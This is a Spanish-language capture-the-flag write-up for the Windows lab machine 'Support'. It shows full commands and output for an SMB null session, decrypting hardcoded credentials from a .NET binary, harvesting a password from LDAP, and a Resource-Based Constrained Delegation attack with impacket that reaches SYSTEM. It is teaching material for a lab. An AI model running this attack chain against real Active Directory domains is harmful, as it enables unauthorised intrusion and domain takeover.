
**Dificultad:** Easy  
**OS:** Windows  
**Fecha:** 20/06/2026  
**Autor:** Ivalba12

---

## Resumen

Support es una máquina Windows que simula un entorno de Active Directory. El camino de compromiso consiste en enumerar un share SMB accesible sin autenticación, analizar un binario .NET con credenciales hardcodeadas, enumerar LDAP para encontrar la contraseña de un usuario, y finalmente escalar privilegios mediante un ataque de Resource-Based Constrained Delegation (RBCD) para obtener acceso como `nt authority\system`.

---

## Reconocimiento

### Ping

Verificamos conectividad con la máquina objetivo:

```bash
ping -c 1 10.129.230.181
```

El TTL de 127 confirma que es una máquina Windows.

### Nmap

```bash
nmap -p53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49664,49667,49678,49690,49695,49708 -sCV 10.129.230.181 -oN escaneo
```

**Puertos relevantes:**

|Puerto|Servicio|Detalle|
|---|---|---|
|53|DNS|Simple DNS Plus|
|88|Kerberos|Microsoft Windows Kerberos|
|389/3268|LDAP|Dominio: `support.htb`|
|445|SMB|Windows Server 2022|
|5985|WinRM|HTTPAPI 2.0|

El escaneo confirma que estamos ante un **Domain Controller** (`Host: DC`, dominio `support.htb`). El puerto 5985 (WinRM) abierto es relevante para obtener shell una vez tengamos credenciales válidas.

---

## Enumeración

### SMB — Null Session

```bash
smbclient -L //10.129.230.181 -N
```

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
NETLOGON        Disk      Logon server share
support-tools   Disk      support staff tools
SYSVOL          Disk      Logon server share
```

El share `support-tools` no es estándar. Accedemos sin contraseña:

```bash
smbclient //10.129.230.181/support-tools -N
```

```
smb: \> ls
  7-ZipPortable_21.07.paf.exe
  npp.8.4.1.portable.x64.zip
  putty.exe
  SysinternalsSuite.zip
  UserInfo.exe.zip     <-- agregado en julio 2022, diferente al resto
  windirstat1_1_2_setup.exe
  WiresharkPortable64_3.6.5.paf.exe
```

`UserInfo.exe.zip` destaca por su nombre específico y fecha diferente. Lo descargamos:

```bash
get UserInfo.exe.zip
```

---

## Análisis del Binario .NET

### Descompresión

```bash
unzip UserInfo.exe.zip
ls -la
```

El contenido revela múltiples DLLs de Microsoft y el ejecutable principal `UserInfo.exe`. Las dependencias (.NET Framework 4.8) confirman que es un binario .NET, ideal para decompilar.

### Búsqueda de strings

Una primera búsqueda encuentra referencias interesantes:

```bash
strings UserInfo.exe | grep -iE "password|pass|ldap"
```

```
getPassword
enc_password
LdapQuery
```

Hay una contraseña encriptada y una función para desencriptarla. Los binarios .NET usan UTF-16 internamente, así que buscamos con el flag `-e l`:

```bash
strings -e l UserInfo.exe | grep -v "^$" | head -50
```

```
0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E
armando
LDAP://support.htb
support\ldap
```

Encontramos:

- **Contraseña encriptada en Base64:** `0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E`
- **Clave de encriptación:** `armando`
- **Usuario LDAP:** `support\ldap`
- **Servidor:** `LDAP://support.htb`

### Desencriptación

El binario usa XOR con la clave `armando` y un byte estático `0xDF` (223). Escribimos el script:

```python
import base64

enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = "armando"

decoded = base64.b64decode(enc_password)
password = ""
for i, byte in enumerate(decoded):
    password += chr(byte ^ ord(key[i % len(key)]) ^ 223)

print(password)
```

```bash
python3 decrypt.py
# nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

**Credenciales obtenidas:** `ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`

### Verificación

```bash
crackmapexec smb 10.129.230.181 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb
```

```
[+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

---

## Enumeración LDAP

Con las credenciales válidas enumeramos usuarios del dominio buscando campos `info` y `description`:

```bash
ldapsearch -x -H ldap://10.129.230.181 \
  -D 'support\ldap' \
  -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b 'DC=support,DC=htb' \
  '(objectClass=user)' sAMAccountName description info
```

El usuario `support` tiene una contraseña en el campo `info`:

```
# support, Users, support.htb
dn: CN=support,CN=Users,DC=support,DC=htb
info: Ironside47pleasure40Watchful
sAMAccountName: support
```

**Credenciales:** `support:Ironside47pleasure40Watchful`

---

## Acceso Inicial — User Flag

Con WinRM abierto en el puerto 5985, nos conectamos:

```bash
evil-winrm -i 10.129.230.181 -u support -p 'Ironside47pleasure40Watchful'
```

```
*Evil-WinRM* PS C:\Users\support\Documents> whoami
support\support
```

```powershell
type C:\Users\support\Desktop\user.txt
```

---

## Escalada de Privilegios — RBCD Attack

### Enumeración de grupos

```powershell
whoami /groups
```

El usuario `support` pertenece al grupo **`SUPPORT\Shared Support Accounts`**, un grupo no estándar.

### BloodHound

Recolectamos datos del dominio:

```bash
bloodhound-python -u support -p 'Ironside47pleasure40Watchful' -d support.htb -ns 10.129.230.181 -c All
```

BloodHound revela que el grupo `Shared Support Accounts` tiene **GenericAll** sobre el objeto del Domain Controller (`DC$`). Esto permite un ataque de **Resource-Based Constrained Delegation (RBCD)**.

### Ataque RBCD

**Paso 1 — Crear una computadora falsa en el dominio:**

```bash
impacket-addcomputer support.htb/support:'Ironside47pleasure40Watchful' \
  -computer-name 'FAKEPC$' \
  -computer-pass 'Password123!' \
  -dc-ip 10.129.230.181
```

```
[*] Successfully added machine account FAKEPC$ with password Password123!.
```

**Paso 2 — Configurar RBCD para que FAKEPC$ pueda delegar sobre DC$:**

```bash
impacket-rbcd support.htb/support:'Ironside47pleasure40Watchful' \
  -delegate-from 'FAKEPC$' \
  -delegate-to 'DC$' \
  -action write \
  -dc-ip 10.129.230.181
```

```
[*] Delegation rights modified successfully!
[*] FAKEPC$ can now impersonate users on DC$ via S4U2Proxy
```

**Paso 3 — Obtener ticket ST como Administrator:**

```bash
impacket-getST support.htb/FAKEPC$:'Password123!' \
  -spn cifs/dc.support.htb \
  -impersonate Administrator \
  -dc-ip 10.129.230.181
```

```
[*] Saving ticket in Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```

**Paso 4 — Usar el ticket para obtener shell:**

```bash
export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
impacket-psexec support.htb/Administrator@dc.support.htb -k -no-pass
```

```
C:\Windows\system32> whoami
nt authority\system
```

### Root Flag

```powershell
type C:\Users\Administrator\Desktop\root.txt
```

---

## Lecciones Aprendidas

- Los shares SMB accesibles sin autenticación son siempre un punto de partida clave en entornos AD.
- Los binarios .NET pueden contener credenciales hardcodeadas. Strings con UTF-16 (`-e l`) es fundamental para analizarlos.
- Los campos `info` y `description` de objetos LDAP son lugares comunes para encontrar contraseñas en CTFs.
- El ataque RBCD es posible cuando un usuario/grupo tiene `GenericAll` sobre un objeto de computadora en AD. El flujo es: crear cuenta de máquina → configurar delegación → S4U2Proxy → ticket como Administrator.

---